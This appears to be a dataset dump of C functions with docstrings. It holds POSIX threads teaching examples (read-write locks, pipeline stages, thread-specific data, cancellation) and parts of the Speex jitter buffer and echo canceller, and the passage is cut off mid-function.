"hailinzeng/Programming-POSIX-Threads", "stars": 56, "license": "None", "language": "c", "size": 150}
{"docstring": "/*\n * Attempt to lock a read-write lock for write access. Don't\n * block if unavailable.\n */\n", "func_signal": "int rwl_writetrylock (rwlock_t *rwl)", "code": "{\n    int status, status2;\n\n    if (rwl->valid != RWLOCK_VALID)\n        return EINVAL;\n    status = pthread_mutex_lock (&rwl->mutex);\n    if (status != 0)\n        return status;\n    if (rwl->w_active || rwl->r_active > 0)\n        status = EBUSY;\n    else\n        rwl->w_active = 1;\n    status2 = pthread_mutex_unlock (&rwl->mutex);\n    return (status != 0 ? status : status2);\n}", "path": "rwlock.c", "repo_name": "hailinzeng/Programming-POSIX-Threads", "stars": 56, "license": "None", "language": "c", "size": 150}
{"docstring": "/*\n * Initialize a read-write lock\n */\n", "func_signal": "int rwl_init (rwlock_t *rwl)", "code": "{\n    int status;\n\n    rwl->r_active = 0;\n    rwl->r_wait = rwl->w_wait = 0;\n    rwl->w_active = 0;\n    status = pthread_mutex_init (&rwl->mutex, NULL);\n    if (status != 0)\n        return status;\n    status = pthread_cond_init (&rwl->read, NULL);\n    if (status != 0) {\n        /* if unable to create read CV, destroy mutex */\n        pthread_mutex_destroy (&rwl->mutex);\n        return status;\n    }\n    status = pthread_cond_init (&rwl->write, NULL);\n    if (status != 0) {\n        /* if unable to create write CV, destroy read CV and mutex */\n        pthread_cond_destroy (&rwl->read);\n        pthread_mutex_destroy (&rwl->mutex);\n        return status;\n    }\n    rwl->valid = RWLOCK_VALID;\n    return 0;\n}", "path": "rwlock.c", "repo_name": "hailinzeng/Programming-POSIX-Threads", "stars": 56, "license": "None", "language": "c", "size": 150}
{"docstring": "/*\n * Destroy a read-write lock\n */\n", "func_signal": "int rwl_destroy (rwlock_t *rwl)", "code": "{\n    int status, status1, status2;\n\n    if (rwl->valid != RWLOCK_VALID)\n        return EINVAL;\n    status = pthread_mutex_lock (&rwl->mutex);\n    if (status != 0)\n        return status;\n\n    /*\n     * Check whether any threads own the lock; report \"BUSY\" if\n     * so.\n     */\n    if (rwl->r_active > 0 || rwl->w_active) {\n        pthread_mutex_unlock (&rwl->mutex);\n        return EBUSY;\n    }\n\n    /*\n     * Check whether any threads are known to be waiting; report\n     * EBUSY if so.\n     */\n    if (rwl->r_wait != 0 || rwl->w_wait != 0) {\n        pthread_mutex_unlock (&rwl->mutex);\n        return EBUSY;\n    }\n\n    rwl->valid = 0;\n    status = pthread_mutex_unlock (&rwl->mutex);\n    if (status != 0)\n        return status;\n    status = pthread_mutex_destroy (&rwl->mutex);\n    status1 = pthread_cond_destroy (&rwl->read);\n    status2 = pthread_cond_destroy (&rwl->write);\n    return (status == 0 ? status : (status1 == 0 ? status1 : status2));\n}", "path": "rwlock.c", "repo_name": "hailinzeng/Programming-POSIX-Threads", "stars": 56, "license": "None", "language": "c", "size": 150}
{"docstring": "/*\n * Unlock a read-write lock from write access.\n */\n", "func_signal": "int rwl_writeunlock (rwlock_t *rwl)", "code": "{\n    int status;\n\n    if (rwl->valid != RWLOCK_VALID)\n        return EINVAL;\n    status = pthread_mutex_lock (&rwl->mutex);\n    if (status != 0)\n        return status;\n    rwl->w_active = 0;\n    if (rwl->r_wait > 0) {\n        status = pthread_cond_broadcast (&rwl->read);\n        if (status != 0) {\n            pthread_mutex_unlock (&rwl->mutex);\n            return status;\n        }\n    } else if (rwl->w_wait > 0) {\n        status = pthread_cond_signal (&rwl->write);\n        if (status != 0) {\n            pthread_mutex_unlock (&rwl->mutex);\n            return status;\n        }\n    }\n    status = pthread_mutex_unlock (&rwl->mutex);\n    return status;\n}", "path": "rwlock.c", "repo_name": "hailinzeng/Programming-POSIX-Threads", "stars": 56, "license": "None", "language": "c", "size": 150}
{"docstring": "/*\n * Attempt to lock a read-write lock for read access (don't\n * block if unavailable).\n */\n", "func_signal": "int rwl_readtrylock (rwlock_t *rwl)", "code": "{\n    int status, status2;\n\n    if (rwl->valid != RWLOCK_VALID)\n        return EINVAL;\n    status = pthread_mutex_lock (&rwl->mutex);\n    if (status != 0)\n        return status;\n    if (rwl->w_active)\n        status = EBUSY;\n    else\n        rwl->r_active++;\n    status2 = pthread_mutex_unlock (&rwl->mutex);\n    return (status2 != 0 ? status2 : status);\n}", "path": "rwlock.c", "repo_name": "hailinzeng/Programming-POSIX-Threads", "stars": 56, "license": "None", "language": "c", "size": 150}
{"docstring": "/*\n * Helper routine to allocate a new value for thread-specific\n * data key if the thread doesn't already have one.\n */\n", "func_signal": "void *identity_key_get (void)", "code": "{\n    void *value;\n    int status;\n\n    value = pthread_getspecific (identity_key);\n    if (value == NULL) {\n        value = malloc (sizeof (private_t));\n        if (value == NULL)\n            errno_abort (\"Allocate key value\");\n        status = pthread_setspecific (identity_key, (void*)value);\n        if (status != 0)\n            err_abort (status, \"Set TSD\");\n    }\n    return value;\n}", "path": "tsd_destructor.c", "repo_name": "hailinzeng/Programming-POSIX-Threads", "stars": 56, "license": "None", "language": "c", "size": 150}
{"docstring": "/*\n * The thread start routine for pipe stage threads.\n * Each will wait for a data item passed from the\n * caller or the previous stage, modify the data\n * and pass it along to the next (or final) stage.\n */\n", "func_signal": "void *pipe_stage (void *arg)", "code": "{\n    stage_t *stage = (stage_t*)arg;\n    stage_t *next_stage = stage->next;\n    int status;\n\n    status = pthread_mutex_lock (&stage->mutex);\n    if (status != 0)\n        err_abort (status, \"Lock pipe stage\");\n    while (1) {\n        while (stage->data_ready != 1) {\n            status = pthread_cond_wait (&stage->avail, &stage->mutex);\n            if (status != 0)\n                err_abort (status, \"Wait for previous stage\");\n        }\n        pipe_send (next_stage, stage->data + 1);\n        stage->data_ready = 0;\n        status = pthread_cond_signal (&stage->ready);\n        if (status != 0)\n            err_abort (status, \"Wake next stage\");\n    }\n    /*\n     * Notice that the routine never unlocks the stage->mutex.\n     * The call to pthread_cond_wait implicitly unlocks the\n     * mutex while the thread is waiting, allowing other threads\n     * to make progress. Because the loop never terminates, this\n     * function has no need to unlock the mutex explicitly.\n     */\n}", "path": "pipe.c", "repo_name": "hailinzeng/Programming-POSIX-Threads", "stars": 56, "license": "None", "language": "c", "size": 150}
{"docstring": "/*\n * Thread start routine that uses read-write locks\n */\n", "func_signal": "void *thread_routine (void *arg)", "code": "{\n    thread_t *self = (thread_t*)arg;\n    int iteration;\n    int element;\n    int status;\n\n    element = 0;                        /* Current data element */\n\n    for (iteration = 0; iteration < ITERATIONS; iteration++) {\n        if ((iteration % self->interval) == 0) {\n            status = rwl_writetrylock (&data[element].lock);\n            if (status == EBUSY)\n                self->w_collisions++;\n            else if (status == 0) {\n                data[element].data++;\n                data[element].updates++;\n                self->updates++;\n                rwl_writeunlock (&data[element].lock);\n            } else\n                err_abort (status, \"Try write lock\");\n        } else {\n            status = rwl_readtrylock (&data[element].lock);\n            if (status == EBUSY)\n                self->r_collisions++;\n            else if (status != 0) {\n                err_abort (status, \"Try read lock\");\n            } else {\n                if (data[element].data != data[element].updates)\n                    printf (\"%d: data[%d] %d != %d\\n\",\n                        self->thread_num, element,\n                        data[element].data, data[element].updates);\n                rwl_readunlock (&data[element].lock);\n            }\n        }\n\n        element++;\n        if (element >= DATASIZE)\n            element = 0;\n    }\n    return NULL;\n}", "path": "rwlock_try_main.c", "repo_name": "hailinzeng/Programming-POSIX-Threads", "stars": 56, "license": "None", "language": "c", "size": 150}
{"docstring": "/*\n * External interface to create a pipeline. All the\n * data is initialized and the threads created. They'll\n * wait for data.\n */\n", "func_signal": "int pipe_create (pipe_t *pipe, int stages)", "code": "{\n    int pipe_index;\n    stage_t **link = &pipe->head, *new_stage, *stage;\n    int status;\n\n    status = pthread_mutex_init (&pipe->mutex, NULL);\n    if (status != 0)\n        err_abort (status, \"Init pipe mutex\");\n    pipe->stages = stages;\n    pipe->active = 0;\n\n    for (pipe_index = 0; pipe_index <= stages; pipe_index++) {\n        new_stage = (stage_t*)malloc (sizeof (stage_t));\n        if (new_stage == NULL)\n            errno_abort (\"Allocate stage\");\n        status = pthread_mutex_init (&new_stage->mutex, NULL);\n        if (status != 0)\n            err_abort (status, \"Init stage mutex\");\n        status = pthread_cond_init (&new_stage->avail, NULL);\n        if (status != 0)\n            err_abort (status, \"Init avail condition\");\n        status = pthread_cond_init (&new_stage->ready, NULL);\n        if (status != 0)\n            err_abort (status, \"Init ready condition\");\n        new_stage->data_ready = 0;\n        *link = new_stage;\n        link = &new_stage->next;\n    }\n\n    *link = (stage_t*)NULL;     /* Terminate list */\n    pipe->tail = new_stage;     /* Record the tail */\n\n    /*\n     * Create the threads for the pipe stages only after all\n     * the data is initialized (including all links). Note\n     * that the last stage doesn't get a thread, it's just\n     * a receptacle for the final pipeline value.\n     *\n     * At this point, proper cleanup on an error would take up\n     * more space than worthwhile in a \"simple example\", so\n     * instead of cancelling and detaching all the threads\n     * already created, plus the synchronization object and\n     * memory cleanup done for earlier errors, it will simply\n     * abort.\n     */\n    for (   stage = pipe->head;\n            stage->next != NULL;\n            stage = stage->next) {\n        status = pthread_create (\n            &stage->thread, NULL, pipe_stage, (void*)stage);\n        if (status != 0)\n            err_abort (status, \"Create pipe stage\");\n    }\n    return 0;\n}", "path": "pipe.c", "repo_name": "hailinzeng/Programming-POSIX-Threads", "stars": 56, "license": "None", "language": "c", "size": 150}
{"docstring": "/*\n * One-time initialization routine used with the pthread_once\n * control block.\n */\n", "func_signal": "void once_routine (void)", "code": "{\n    int status;\n\n    printf (\"initializing key\\n\");\n    status = pthread_key_create (&tsd_key, NULL);\n    if (status != 0)\n        err_abort (status, \"Create key\");\n}", "path": "tsd_once.c", "repo_name": "hailinzeng/Programming-POSIX-Threads", "stars": 56, "license": "None", "language": "c", "size": 150}
{"docstring": "/*\n * External interface to start a pipeline by passing\n * data to the first stage. The routine returns while\n * the pipeline processes in parallel. Call the\n * pipe_result return to collect the final stage values\n * (note that the pipe will stall when each stage fills,\n * until the result is collected).\n */\n", "func_signal": "int pipe_start (pipe_t *pipe, long value)", "code": "{\n    int status;\n\n    status = pthread_mutex_lock (&pipe->mutex);\n    if (status != 0)\n        err_abort (status, \"Lock pipe mutex\");\n    pipe->active++;\n    status = pthread_mutex_unlock (&pipe->mutex);\n    if (status != 0)\n        err_abort (status, \"Unlock pipe mutex\");\n    pipe_send (pipe->head, value);\n    return 0;\n}", "path": "pipe.c", "repo_name": "hailinzeng/Programming-POSIX-Threads", "stars": 56, "license": "None", "language": "c", "size": 150}
{"docstring": "/*\n * Unlock a read-write lock from read access.\n */\n", "func_signal": "int rwl_readunlock (rwlock_t *rwl)", "code": "{\n    int status, status2;\n\n    if (rwl->valid != RWLOCK_VALID)\n        return EINVAL;\n    status = pthread_mutex_lock (&rwl->mutex);\n    if (status != 0)\n        return status;\n    rwl->r_active--;\n    if (rwl->r_active == 0 && rwl->w_wait > 0)\n        status = pthread_cond_signal (&rwl->write);\n    status2 = pthread_mutex_unlock (&rwl->mutex);\n    return (status2 == 0 ? status : status2);\n}", "path": "rwlock.c", "repo_name": "hailinzeng/Programming-POSIX-Threads", "stars": 56, "license": "None", "language": "c", "size": 150}
{"docstring": "/*\n * Thread start routine.\n */\n", "func_signal": "void *thread_routine (void *arg)", "code": "{\n    int state;\n    int status;\n\n    for (counter = 0; ; counter++) {\n\n        /*\n         * Each 755 iterations, disable cancellation and sleep\n         * for one second.\n         *\n         * Each 1000 iterations, test for a pending cancel by\n         * calling pthread_testcancel().\n         */\n        if ((counter % 755) == 0) {\n            status = pthread_setcancelstate (\n                PTHREAD_CANCEL_DISABLE, &state);\n            if (status != 0)\n                err_abort (status, \"Disable cancel\");\n            sleep (1);\n            status = pthread_setcancelstate (\n                state, &state);\n            if (status != 0)\n                err_abort (status, \"Restore cancel\");\n        } else\n            if ((counter % 1000) == 0)\n                pthread_testcancel ();\n    }\n}", "path": "cancel_disable.c", "repo_name": "hailinzeng/Programming-POSIX-Threads", "stars": 56, "license": "None", "language": "c", "size": 150}
{"docstring": "/*\n * Lock a read-write lock for read access.\n */\n", "func_signal": "int rwl_readlock (rwlock_t *rwl)", "code": "{\n    int status;\n\n    if (rwl->valid != RWLOCK_VALID)\n        return EINVAL;\n    status = pthread_mutex_lock (&rwl->mutex);\n    if (status != 0)\n        return status;\n    if (rwl->w_active) {\n        rwl->r_wait++;\n        pthread_cleanup_push (rwl_readcleanup, (void*)rwl);\n        while (rwl->w_active) {\n            status = pthread_cond_wait (&rwl->read, &rwl->mutex);\n            if (status != 0)\n                break;\n        }\n        pthread_cleanup_pop (0);\n        rwl->r_wait--;\n    }\n    if (status == 0)\n        rwl->r_active++;\n    pthread_mutex_unlock (&rwl->mutex);\n    return status;\n}", "path": "rwlock.c", "repo_name": "hailinzeng/Programming-POSIX-Threads", "stars": 56, "license": "None", "language": "c", "size": 150}
{"docstring": "/*\n * Internal function to send a \"message\" to the\n * specified pipe stage. Threads use this to pass\n * along the modified data item.\n */\n", "func_signal": "int pipe_send (stage_t *stage, long data)", "code": "{\n    int status;\n\n    status = pthread_mutex_lock (&stage->mutex);\n    if (status != 0)\n        return status;\n    /*\n     * If there's data in the pipe stage, wait for it\n     * to be consumed.\n     */\n    while (stage->data_ready) {\n        status = pthread_cond_wait (&stage->ready, &stage->mutex);\n        if (status != 0) {\n            pthread_mutex_unlock (&stage->mutex);\n            return status;\n        }\n    }\n\n    /*\n     * Send the new data\n     */\n    stage->data = data;\n    stage->data_ready = 1;\n    status = pthread_cond_signal (&stage->avail);\n    if (status != 0) {\n        pthread_mutex_unlock (&stage->mutex);\n        return status;\n    }\n    status = pthread_mutex_unlock (&stage->mutex);\n    return status;\n}", "path": "pipe.c", "repo_name": "hailinzeng/Programming-POSIX-Threads", "stars": 56, "license": "None", "language": "c", "size": 150}
{"docstring": "/*\n * Collect the result of the pipeline. Wait for a\n * result if the pipeline hasn't produced one.\n */\n", "func_signal": "int pipe_result (pipe_t *pipe, long *result)", "code": "{\n    stage_t *tail = pipe->tail;\n    long value;\n    int empty = 0;\n    int status;\n\n    status = pthread_mutex_lock (&pipe->mutex);\n    if (status != 0)\n        err_abort (status, \"Lock pipe mutex\");\n    if (pipe->active <= 0)\n        empty = 1;\n    else\n        pipe->active--;\n\n    status = pthread_mutex_unlock (&pipe->mutex);\n    if (status != 0)\n        err_abort (status, \"Unlock pipe mutex\");\n    if (empty)\n        return 0;\n\n    pthread_mutex_lock (&tail->mutex);\n    while (!tail->data_ready)\n        pthread_cond_wait (&tail->avail, &tail->mutex);\n    *result = tail->data;\n    tail->data_ready = 0;\n    pthread_cond_signal (&tail->ready);\n    pthread_mutex_unlock (&tail->mutex);    \n    return 1;\n}", "path": "pipe.c", "repo_name": "hailinzeng/Programming-POSIX-Threads", "stars": 56, "license": "None", "language": "c", "size": 150}
{"docstring": "/*\n * Thread start routine to use thread-specific data.\n */\n", "func_signal": "void *thread_routine (void *arg)", "code": "{\n    private_t *value;\n\n    value = (private_t*)identity_key_get ();\n    value->thread_id = pthread_self ();\n    value->string = (char*)arg;\n    printf (\"thread \\\"%s\\\" starting...\\n\", value->string);\n    sleep (2);\n    return NULL;    \n}", "path": "tsd_destructor.c", "repo_name": "hailinzeng/Programming-POSIX-Threads", "stars": 56, "license": "None", "language": "c", "size": 150}
{"docstring": "/*\n * This routine is called as each thread terminates with a value\n * for the thread-specific data key. It keeps track of how many\n * threads still have values, and deletes the key when there are\n * no more references.\n */\n", "func_signal": "void identity_key_destructor (void *value)", "code": "{\n    private_t *private = (private_t*)value;\n    int status;\n\n    printf (\"thread \\\"%s\\\" exiting...\\n\", private->string);\n    free (value);\n    status = pthread_mutex_lock (&identity_key_mutex);\n    if (status != 0)\n        err_abort (status, \"Lock key mutex\");\n    identity_key_counter--;\n    if (identity_key_counter <= 0) {\n        status = pthread_key_delete (identity_key);\n        if (status != 0)\n            err_abort (status, \"Delete key\");\n        printf (\"key deleted...\\n\");\n    }\n    status = pthread_mutex_unlock (&identity_key_mutex);\n    if (status != 0)\n        err_abort (status, \"Unlock key mutex\");\n}", "path": "tsd_destructor.c", "repo_name": "hailinzeng/Programming-POSIX-Threads", "stars": 56, "license": "None", "language": "c", "size": 150}
{"docstring": "/** Take the following timing into consideration for future calculations */\n", "func_signal": "static void update_timings(JitterBuffer *jitter, spx_int32_t timing)", "code": "{\n   if (timing < -32767)\n      timing = -32767;\n   if (timing > 32767)\n      timing = 32767;\n   /* If the current sub-window is full, perform a rotation and discard oldest sub-widow */\n   if (jitter->timeBuffers[0]->curr_count >= jitter->subwindow_size)\n   {\n      int i;\n      /*fprintf(stderr, \"Rotate buffer\\n\");*/\n      struct TimingBuffer *tmp = jitter->timeBuffers[MAX_BUFFERS-1];\n      for (i=MAX_BUFFERS-1;i>=1;i--)\n         jitter->timeBuffers[i] = jitter->timeBuffers[i-1];\n      jitter->timeBuffers[0] = tmp;\n      tb_init(jitter->timeBuffers[0]);\n   }\n   tb_add(jitter->timeBuffers[0], timing);\n}", "path": "speexjni\\jni\\libspeex\\jitter.c", "repo_name": "mutantbob/ndk-speex", "stars": 44, "license": "None", "language": "c", "size": 407}
{"docstring": "/** Compute weighted cross-power spectrum of a half-complex (packed) vector with conjugate */\n", "func_signal": "static inline void weighted_spectral_mul_conj(const spx_float_t *w, const spx_float_t p, const spx_word16_t *X, const spx_word16_t *Y, spx_word32_t *prod, int N)", "code": "{\n   int i, j;\n   spx_float_t W;\n   W = FLOAT_AMULT(p, w[0]);\n   prod[0] = FLOAT_MUL32(W,MULT16_16(X[0],Y[0]));\n   for (i=1,j=1;i<N-1;i+=2,j++)\n   {\n      W = FLOAT_AMULT(p, w[j]);\n      prod[i] = FLOAT_MUL32(W,MAC16_16(MULT16_16(X[i],Y[i]), X[i+1],Y[i+1]));\n      prod[i+1] = FLOAT_MUL32(W,MAC16_16(MULT16_16(-X[i+1],Y[i]), X[i],Y[i+1]));\n   }\n   W = FLOAT_AMULT(p, w[j]);\n   prod[i] = FLOAT_MUL32(W,MULT16_16(X[i],Y[i]));\n}", "path": "speexjni\\jni\\libspeex\\mdf.c", "repo_name": "mutantbob/ndk-speex", "stars": 44, "license": "None", "language": "c", "size": 407}
{"docstring": "/** Reset jitter buffer */\n", "func_signal": "EXPORT void jitter_buffer_reset(JitterBuffer *jitter)", "code": "{\n   int i;\n   for (i=0;i<SPEEX_JITTER_MAX_BUFFER_SIZE;i++)\n   {\n      if (jitter->packets[i].data)\n      {\n         if (jitter->destroy)\n            jitter->destroy(jitter->packets[i].data);\n         else\n            speex_free(jitter->packets[i].data);\n         jitter->packets[i].data = NULL;\n      }\n   }\n   /* Timestamp is actually undefined at this point */\n   jitter->pointer_timestamp = 0;\n   jitter->next_stop = 0;\n   jitter->reset_state = 1;\n   jitter->lost_count = 0;\n   jitter->buffered = 0;\n   jitter->auto_tradeoff = 32000;\n   \n   for (i=0;i<MAX_BUFFERS;i++)\n   {\n      tb_init(&jitter->_tb[i]);\n      jitter->timeBuffers[i] = &jitter->_tb[i];\n   }\n   /*fprintf (stderr, \"reset\\n\");*/\n}", "path": "speexjni\\jni\\libspeex\\jitter.c", "repo_name": "mutantbob/ndk-speex", "stars": 44, "license": "None", "language": "c", "size": 407}
{"docstring": "/** Get one packet from the jitter buffer */\n", "func_signal": "EXPORT int jitter_buffer_get(JitterBuffer *jitter, JitterBufferPacket *packet, spx_int32_t desired_span, spx_int32_t *start_offset)", "code": "{\n   int i;\n   unsigned int j;\n   int incomplete = 0;\n   spx_int16_t opt;\n   \n   if (start_offset != NULL)\n      *start_offset = 0;\n\n   /* Syncing on the first call */\n   if (jitter->reset_state)\n   {\n      int found = 0;\n      /* Find the oldest packet */\n      spx_uint32_t oldest=0;\n      for (i=0;i<SPEEX_JITTER_MAX_BUFFER_SIZE;i++)\n      {\n         if (jitter->packets[i].data && (!found || LT32(jitter->packets[i].timestamp,oldest)))\n         {\n            oldest = jitter->packets[i].timestamp;\n            found = 1;\n         }\n      }\n      if (found)\n      {\n         jitter->reset_state=0;         \n         jitter->pointer_timestamp = oldest;\n         jitter->next_stop = oldest;\n      } else {\n         packet->timestamp = 0;\n         packet->span = jitter->interp_requested;\n         return JITTER_BUFFER_MISSING;\n      }\n   }\n   \n\n   jitter->last_returned_timestamp = jitter->pointer_timestamp;\n         \n   if (jitter->interp_requested != 0)\n   {\n      packet->timestamp = jitter->pointer_timestamp;\n      packet->span = jitter->interp_requested;\n      \n      /* Increment the pointer because it got decremented in the delay update */\n      jitter->pointer_timestamp += jitter->interp_requested;\n      packet->len = 0;\n      /*fprintf (stderr, \"Deferred interpolate\\n\");*/\n      \n      jitter->interp_requested = 0;\n      \n      jitter->buffered = packet->span - desired_span;\n\n      return JITTER_BUFFER_INSERTION;\n   }\n   \n   /* Searching for the packet that fits best */\n   \n   /* Search the buffer for a packet with the right timestamp and spanning the whole current chunk */\n   for (i=0;i<SPEEX_JITTER_MAX_BUFFER_SIZE;i++)\n   {\n      if (jitter->packets[i].data && jitter->packets[i].timestamp==jitter->pointer_timestamp && GE32(jitter->packets[i].timestamp+jitter->packets[i].span,jitter->pointer_timestamp+desired_span))\n         break;\n   }\n   \n   /* If no match, try for an \"older\" packet that still spans (fully) the current chunk */\n   if (i==SPEEX_JITTER_MAX_BUFFER_SIZE)\n   {\n      for (i=0;i<SPEEX_JITTER_MAX_BUFFER_SIZE;i++)\n      {\n         if (jitter->packets[i].data && LE32(jitter->packets[i].timestamp, jitter->pointer_timestamp) && GE32(jitter->packets[i].timestamp+jitter->packets[i].span,jitter->pointer_timestamp+desired_span))\n            break;\n      }\n   }\n   \n   /* If still no match, try for an \"older\" packet that spans part of the current chunk */\n   if (i==SPEEX_JITTER_MAX_BUFFER_SIZE)\n   {\n      for (i=0;i<SPEEX_JITTER_MAX_BUFFER_SIZE;i++)\n      {\n         if (jitter->packets[i].data && LE32(jitter->packets[i].timestamp, jitter->pointer_timestamp) && GT32(jitter->packets[i].timestamp+jitter->packets[i].span,jitter->pointer_timestamp))\n            break;\n      }\n   }\n   \n   /* If still no match, try for earliest packet possible */\n   if (i==SPEEX_JITTER_MAX_BUFFER_SIZE)\n   {\n      int found = 0;\n      spx_uint32_t best_time=0;\n      int best_span=0;\n      int besti=0;\n      for (i=0;i<SPEEX_JITTER_MAX_BUFFER_SIZE;i++)\n      {\n         /* check if packet starts within current chunk */\n         if (jitter->packets[i].data && LT32(jitter->packets[i].timestamp,jitter->pointer_timestamp+desired_span) && GE32(jitter->packets[i].timestamp,jitter->pointer_timestamp))\n         {\n            if (!found || LT32(jitter->packets[i].timestamp,best_time) || (jitter->packets[i].timestamp==best_time && GT32(jitter->packets[i].span,best_span)))\n            {\n               best_time = jitter->packets[i].timestamp;\n               best_span = jitter->packets[i].span;\n               besti = i;\n               found = 1;\n            }\n         }\n      }\n      if (found)\n      {\n         i=besti;\n         incomplete = 1;\n         /*fprintf (stderr, \"incomplete: %d %d %d %d\\n\", jitter->packets[i].timestamp, jitter->pointer_timestamp, chunk_size, jitter->packets[i].span);*/\n      }\n   }\n\n   /* If we find something */\n   if (i!=SPEEX_JITTER_MAX_BUFFER_SIZE)\n   {\n      spx_int32_t offset;\n      \n      /* We (obviously) haven't lost this packet */\n      jitter->lost_count = 0;\n      \n      /* In this case, 0 isn't as a valid timestamp */\n      if (jitter->arrival[i] != 0)\n      {\n         update_timings(jitter, ((spx_int32_t)jitter->packets[i].timestamp) - ((spx_int32_t)jitter->arrival[i]) - jitter->buffer_margin);\n      }\n      \n      \n      /* Copy packet */\n      if (jitter->destroy)\n      {\n         packet->data = jitter->packets[i].data;\n         packet->len = jitter->packets[i].len;\n      } else {\n         if (jitter->packets[i].len > packet->len)\n         {\n            speex_warning_int(\"jitter_buffer_get(): packet too large to fit. Size is\", jitter->packets[i].len);\n         } else {\n            packet->len = jitter->packets[i].len;\n         }\n         for (j=0;j<packet->len;j++)\n            packet->data[j] = jitter->packets[i].data[j];\n         /* Remove packet */\n         speex_free(jitter->packets[i].data);\n      }\n      jitter->packets[i].data = NULL;\n      /* Set timestamp and span (if requested) */\n      offset = (spx_int32_t)jitter->packets[i].timestamp-(spx_int32_t)jitter->pointer_timestamp;\n      if (start_offset != NULL)\n         *start_offset = offset;\n      else if (offset != 0)\n         speex_warning_int(\"jitter_buffer_get() discarding non-zero start_offset\", offset);\n      \n      packet->timestamp = jitter->packets[i].timestamp;\n      jitter->last_returned_timestamp = packet->timestamp;\n      \n      packet->span = jitter->packets[i].span;\n      packet->sequence = jitter->packets[i].sequence;\n      packet->user_data = jitter->packets[i].user_data;\n      /* Point to the end of the current packet */\n      jitter->pointer_timestamp = jitter->packets[i].timestamp+jitter->packets[i].span;\n\n      jitter->buffered = packet->span - desired_span;\n      \n      if (start_offset != NULL)\n         jitter->buffered += *start_offset;\n      \n      return JITTER_BUFFER_OK;\n   }\n   \n   \n   /* If we haven't found anything worth returning */\n   \n   /*fprintf (stderr, \"not found\\n\");*/\n   jitter->lost_count++;\n   /*fprintf (stderr, \"m\");*/\n   /*fprintf (stderr, \"lost_count = %d\\n\", jitter->lost_count);*/\n   \n   opt = compute_opt_delay(jitter);\n   \n   /* Should we force an increase in the buffer or just do normal interpolation? */   \n   if (opt < 0)\n   {\n      /* Need to increase buffering */\n      \n      /* Shift histogram to compensate */\n      shift_timings(jitter, -opt);\n      \n      packet->timestamp = jitter->pointer_timestamp;\n      packet->span = -opt;\n      /* Don't move the pointer_timestamp forward */\n      packet->len = 0;\n      \n      jitter->buffered = packet->span - desired_span;\n      return JITTER_BUFFER_INSERTION;\n      /*jitter->pointer_timestamp -= jitter->delay_step;*/\n      /*fprintf (stderr, \"Forced to interpolate\\n\");*/\n   } else {\n      /* Normal packet loss */\n      packet->timestamp = jitter->pointer_timestamp;\n      \n      desired_span = ROUND_DOWN(desired_span, jitter->concealment_size);\n      packet->span = desired_span;\n      jitter->pointer_timestamp += desired_span;\n      packet->len = 0;\n      \n      jitter->buffered = packet->span - desired_span;\n      return JITTER_BUFFER_MISSING;\n      /*fprintf (stderr, \"Normal loss\\n\");*/\n   }\n\n\n}", "path": "speexjni\\jni\\libspeex\\jitter.c", "repo_name": "mutantbob/ndk-speex", "stars": 44, "license": "None", "language": "c", "size": 407}
{"docstring": "/* Used like the ioctl function to control the jitter buffer parameters */\n", "func_signal": "EXPORT int jitter_buffer_ctl(JitterBuffer *jitter, int request, void *ptr)", "code": "{\n   int count, i;\n   switch(request)\n   {\n      case JITTER_BUFFER_SET_MARGIN:\n         jitter->buffer_margin = *(spx_int32_t*)ptr;\n         break;\n      case JITTER_BUFFER_GET_MARGIN:\n         *(spx_int32_t*)ptr = jitter->buffer_margin;\n         break;\n      case JITTER_BUFFER_GET_AVALIABLE_COUNT:\n         count = 0;\n         for (i=0;i<SPEEX_JITTER_MAX_BUFFER_SIZE;i++)\n         {\n            if (jitter->packets[i].data && LE32(jitter->pointer_timestamp, jitter->packets[i].timestamp))\n            {\n               count++;\n            }\n         }\n         *(spx_int32_t*)ptr = count;\n         break;\n      case JITTER_BUFFER_SET_DESTROY_CALLBACK:\n         jitter->destroy = (void (*) (void *))ptr;\n         break;\n      case JITTER_BUFFER_GET_DESTROY_CALLBACK:\n         *(void (**) (void *))ptr = jitter->destroy;\n         break;\n      case JITTER_BUFFER_SET_DELAY_STEP:\n         jitter->delay_step = *(spx_int32_t*)ptr;\n         break;\n      case JITTER_BUFFER_GET_DELAY_STEP:\n         *(spx_int32_t*)ptr = jitter->delay_step;\n         break;\n      case JITTER_BUFFER_SET_CONCEALMENT_SIZE:\n         jitter->concealment_size = *(spx_int32_t*)ptr;\n         break;\n      case JITTER_BUFFER_GET_CONCEALMENT_SIZE:\n         *(spx_int32_t*)ptr = jitter->concealment_size;\n         break;\n      case JITTER_BUFFER_SET_MAX_LATE_RATE:\n         jitter->max_late_rate = *(spx_int32_t*)ptr;\n         jitter->window_size = 100*TOP_DELAY/jitter->max_late_rate;\n         jitter->subwindow_size = jitter->window_size/MAX_BUFFERS;\n         break;\n      case JITTER_BUFFER_GET_MAX_LATE_RATE:\n         *(spx_int32_t*)ptr = jitter->max_late_rate;\n         break;\n      case JITTER_BUFFER_SET_LATE_COST:\n         jitter->latency_tradeoff = *(spx_int32_t*)ptr;\n         break;\n      case JITTER_BUFFER_GET_LATE_COST:\n         *(spx_int32_t*)ptr = jitter->latency_tradeoff;\n         break;\n      default:\n         speex_warning_int(\"Unknown jitter_buffer_ctl request: \", request);\n         return -1;\n   }\n   return 0;\n}", "path": "speexjni\\jni\\libspeex\\jitter.c", "repo_name": "mutantbob/ndk-speex", "stars": 44, "license": "None", "language": "c", "size": 407}
{"docstring": "/** Put one packet into the jitter buffer */\n", "func_signal": "EXPORT void jitter_buffer_put(JitterBuffer *jitter, const JitterBufferPacket *packet)", "code": "{\n   int i,j;\n   int late;\n   /*fprintf (stderr, \"put packet %d %d\\n\", timestamp, span);*/\n   \n   /* Cleanup buffer (remove old packets that weren't played) */\n   if (!jitter->reset_state)\n   {\n      for (i=0;i<SPEEX_JITTER_MAX_BUFFER_SIZE;i++)\n      {\n         /* Make sure we don't discard a \"just-late\" packet in case we want to play it next (if we interpolate). */\n         if (jitter->packets[i].data && LE32(jitter->packets[i].timestamp + jitter->packets[i].span, jitter->pointer_timestamp))\n         {\n            /*fprintf (stderr, \"cleaned (not played)\\n\");*/\n            if (jitter->destroy)\n               jitter->destroy(jitter->packets[i].data);\n            else\n               speex_free(jitter->packets[i].data);\n            jitter->packets[i].data = NULL;\n         }\n      }\n   }\n   \n   /*fprintf(stderr, \"arrival: %d %d %d\\n\", packet->timestamp, jitter->next_stop, jitter->pointer_timestamp);*/\n   /* Check if packet is late (could still be useful though) */\n   if (!jitter->reset_state && LT32(packet->timestamp, jitter->next_stop))\n   {\n      update_timings(jitter, 